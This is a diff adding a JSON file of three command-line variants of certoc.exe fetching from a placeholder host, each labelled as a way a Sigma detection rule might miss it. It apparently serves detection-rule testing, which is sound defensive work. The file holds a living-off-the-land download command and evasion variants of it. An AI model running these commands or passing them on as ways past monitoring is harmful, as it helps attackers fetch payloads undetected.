@@ -1,0 +1,14 @@
+[
+  {
+    "output": "\"C:\\Windows\\SysWOW64\\certoc.exe\" -GetCACAPS \"http://192.0.2.10/certsrv/\"",
+    "explanation": "Insertion: Added escape characters to the command line; the Sigma rule may miss it due to altered parsing."
+  },
+  {
+    "output": "certoc.exe -GetCACAPS http://192.0.2.10/certsrv/",
+    "explanation": "Omission: Removed quotes around the executable path; the Sigma rule may miss it due to altered parsing."
+  },
+  {
+    "output": "certoc -GetCACAPS http://192.0.2.10/certsrv/",
+    "explanation": "Substitution: Replaced 'certoc.exe' with 'certoc'; the Sigma rule may miss it due to altered parsing."
+  }
+]
